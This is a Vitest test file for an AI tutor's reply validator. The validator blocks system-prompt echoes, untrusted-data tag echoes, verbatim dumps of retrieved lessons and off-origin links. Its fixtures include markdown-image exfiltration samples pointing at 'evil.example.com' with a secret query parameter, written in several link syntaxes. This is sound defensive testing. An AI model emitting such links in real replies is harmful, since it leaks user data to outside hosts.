import { beforeEach, describe, expect, it, vi } from "vitest";

const { mockLogSecurityEvent } = vi.hoisted(() => ({
	mockLogSecurityEvent: vi.fn(),
}));

vi.mock("@/server/services/_shared/aiGuard/securityLog", () => ({
	logSecurityEvent: mockLogSecurityEvent,
}));
const { validateReply } = await import("./validateReply");

const ctx = (retrievedContent: string[] = []) => ({
	userId: "user-1",
	retrievedContent,
});

describe("validateReply", () => {
	beforeEach(() => mockLogSecurityEvent.mockClear());

	it("passes an ordinary answer", () => {
		expect(validateReply("A base case stops the recursion.", ctx())).toEqual({
			valid: true,
		});
		expect(mockLogSecurityEvent).not.toHaveBeenCalled();
	});

	it("rejects an echo of the system prompt", () => {
		const result = validateReply(
			"Sure — my instructions say: Tool usage rules (follow in order):",
			ctx(),
		);
		expect(result).toEqual({ valid: false, ruleId: "system_prompt_echo" });
	});

	it("rejects an echo of the untrusted-data markup", () => {
		const result = validateReply(
			'Here it is: <untrusted_data source="lesson_content">',
			ctx(),
		);
		expect(result).toEqual({ valid: false, ruleId: "untrusted_data_echo" });
	});

	it("rejects the untrusted-data markup whatever its casing", () => {
		const result = validateReply("Here it is: <UNTRUSTED_DATA>", ctx());
		expect(result).toEqual({ valid: false, ruleId: "untrusted_data_echo" });
	});

	it("rejects a verbatim dump of retrieved content", () => {
		const chunk =
			"Recursion terminates at the base case, which is the smallest input the function can answer directly without calling itself again.";
		const result = validateReply(`As the lesson says: ${chunk}`, ctx([chunk]));
		expect(result).toEqual({ valid: false, ruleId: "verbatim_chunk_echo" });
	});

	it("allows a short quoted phrase from retrieved content", () => {
		const chunk =
			"Recursion terminates at the base case, which is the smallest input the function can answer directly without calling itself again.";
		const result = validateReply(
			'The key term is "base case" — it stops the descent.',
			ctx([chunk]),
		);
		expect(result).toEqual({ valid: true });
	});

	it("rejects an off-origin markdown image", () => {
		const result = validateReply(
			"![](https://evil.example.com/?d=secret)",
			ctx(),
		);
		expect(result).toEqual({ valid: false, ruleId: "off_origin_link" });
	});

	// "//host" inherits our scheme but not our host — it is exfiltration with a
	// shape that looks relative.
	it("rejects a protocol-relative link", () => {
		expect(validateReply("![](//evil.example.com/?d=secret)", ctx())).toEqual({
			valid: false,
			ruleId: "off_origin_link",
		});
	});

	// CommonMark spells a destination four ways and every one of them renders.
	// Each of these walked past the original inline-only regex.
	describe.each([
		[
			"a title after the destination",
			'![x](https://evil.example.com/?d=s "t")',
		],
		[
			"a whitespace-padded destination",
			"![x]( https://evil.example.com/?d=s )",
		],
		["a pointy-bracket destination", "![x](<https://evil.example.com/?d=s>)"],
		[
			"a reference definition",
			"![x][ref]\n\n[ref]: https://evil.example.com/?d=s",
		],
		["an autolink", "Look here: <https://evil.example.com/?d=s>"],
	])("off-origin destinations", (label, reply) => {
		it(`rejects ${label}`, () => {
			expect(validateReply(reply, ctx())).toEqual({
				valid: false,
				ruleId: "off_origin_link",
			});
		});
	});

	it("allows an in-app reference definition", () => {
		expect(
			validateReply("See [it][ref].\n\n[ref]: /dashboard/lesson-2", ctx()),
		).toEqual({ valid: true });
	});

	it("allows a relative in-app link", () => {
		expect(
			validateReply("See [lesson 2](/dashboard/lesson-2).", ctx()),
		).toEqual({ valid: true });
	});

	it("logs output_validation_failed on rejection, with no reply text", () => {
		validateReply("![](https://evil.example.com/?d=secret)", ctx());

		const event = mockLogSecurityEvent.mock.calls[0]?.[0];
		expect(event).toMatchObject({
			feature: "lessonAI",
			layer: "output_validation",
			outcome: "output_validation_failed",
			ruleIds: ["off_origin_link"],
		});
		expect(JSON.stringify(event)).not.toContain("evil.example.com");
	});
});

describe("validateReply composed over the shared boundary", () => {
	beforeEach(() => mockLogSecurityEvent.mockClear());

	const CHUNK =
		"Recursion is a technique in which a function calls itself with a smaller input until it reaches a base case that returns directly.";

	it("emits exactly one event on a shared-rule rejection", () => {
		validateReply('<untrusted_data source="lesson_content">', ctx());

		expect(mockLogSecurityEvent).toHaveBeenCalledTimes(1);
		expect(mockLogSecurityEvent.mock.calls[0]?.[0]).toMatchObject({
			ruleIds: ["untrusted_data_echo"],
		});
	});

	it("emits exactly one event on the tutor's own rule", () => {
		validateReply(CHUNK, ctx([CHUNK]));

		expect(mockLogSecurityEvent).toHaveBeenCalledTimes(1);
		expect(mockLogSecurityEvent.mock.calls[0]?.[0]).toMatchObject({
			ruleIds: ["verbatim_chunk_echo"],
		});
	});

	it("emits exactly one event when a reply trips both layers", () => {
		validateReply(`${CHUNK}\n\n![x](https://evil.example.com/p)`, ctx([CHUNK]));

		expect(mockLogSecurityEvent).toHaveBeenCalledTimes(1);
	});

	it("keeps precedence: untrusted_data_echo beats verbatim_chunk_echo", () => {
		// The pair most exposed by the two-part composition: the shared boundary
		// returns the tag echo, and the tutor's own verbatim check must not
		// overwrite it.
		expect(validateReply(`<untrusted_data> ${CHUNK}`, ctx([CHUNK]))).toEqual({
			valid: false,
			ruleId: "untrusted_data_echo",
		});
	});

	it("keeps precedence: verbatim beats off_origin, prompt echo beats verbatim", () => {
		expect(
			validateReply(
				`${CHUNK}\n\n![x](https://evil.example.com/p)`,
				ctx([CHUNK]),
			),
		).toEqual({ valid: false, ruleId: "verbatim_chunk_echo" });

		expect(
			validateReply(
				`Tool usage rules (follow in order): ${CHUNK}`,
				ctx([CHUNK]),
			),
		).toEqual({ valid: false, ruleId: "system_prompt_echo" });
	});

	it("still reports an 87-character verbatim run as verbatim_chunk_echo (AC 10)", () => {
		const run = CHUNK.slice(0, 87);

		expect(validateReply(`Here you go: ${run}`, ctx([CHUNK]))).toEqual({
			valid: false,
			ruleId: "verbatim_chunk_echo",
		});
	});
});

describe("concept_check_answer_echo", () => {
	const withCheck = (correctOption: string | null) => ({
		userId: "user-1",
		retrievedContent: [],
		pendingCheckAnswer: correctOption,
	});

	it("suppresses the check when the reply gives its answer away", () => {
		const result = validateReply(
			"In short, the base case is what stops the recursion.",
			withCheck("the base case"),
		);

		// The reply itself stands. Suppression, not retraction: the correct option
		// is by construction a phrase from the lesson the tutor just explained, so
		// exact-substring matching here has a structurally high false-positive
		// rate — unlike system_prompt_echo, whose markers never occur in prose.
		expect(result).toEqual({ valid: true, suppressCheck: true });
	});

	it("matches regardless of case and surrounding whitespace", () => {
		const result = validateReply(
			"Remember:   The  Base  Case   ends it.",
			withCheck("the base case"),
		);

		expect(result).toEqual({ valid: true, suppressCheck: true });
	});

	it("leaves the check alone when the reply names only a wrong option", () => {
		const result = validateReply(
			"A recursive call does not end the descent.",
			withCheck("the base case"),
		);

		expect(result).toEqual({ valid: true });
	});

	it("cannot fire when no check was authored this turn", () => {
		const result = validateReply(
			"The base case is what stops the recursion.",
			withCheck(null),
		);

		expect(result).toEqual({ valid: true });
	});

	it("does not rescue a reply that fails a real rule", () => {
		const result = validateReply(
			"Tool usage rules (follow in order): ",
			withCheck("the base case"),
		);

		expect(result.valid).toBe(false);
	});
});
